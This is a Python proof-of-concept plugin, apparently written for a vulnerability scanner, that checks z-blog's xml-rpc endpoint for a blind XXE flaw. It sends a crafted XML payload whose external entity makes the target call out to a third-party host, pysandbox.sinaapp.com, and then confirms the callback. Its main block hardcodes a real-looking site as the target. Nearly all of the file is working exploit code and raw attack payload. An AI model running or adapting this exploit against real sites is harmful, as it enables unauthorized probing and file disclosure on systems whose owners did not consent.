#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  z-blog Blind XXE file download
Author    :  a
mail      :  a@lcx.cc
Referer   : http://www.wooyun.org/bugs/wooyun-2010-098591
"""

import urlparse
def assign(service, arg):
    if service == 'zblog':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = 'zb_system/xml-rpc/index.php'
    url = arg + payload
    raw = '''POST /zb_system/xml-rpc/index.php HTTP/1.1
Content-Length: 182
Connection: Keep-Alive
Accept: */*
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: liushumeng.com
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="UTF-8" standalone="no" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://pysandbox.sinaapp.com/kv?act=set&k={key}&v=testvul">%remote;]></root>'''
    key = arg.replace('http://','').replace('/','').replace(':','')
    code, head, res, errcode, _ = curl.curl2(url,raw=raw.replace('{key}',key))
    keyurl = 'http://pysandbox.sinaapp.com/kv?act=get&k=%s' %(key)
    code, head, res, errcode, _ = curl.curl2(keyurl)
    if 'testvul' in res:
        security_hole('find z-blog Blind XXE')
   

if __name__ == '__main__':
    from dummy import *
    audit(assign('zblog', 'http://liushumeng.com/')[1])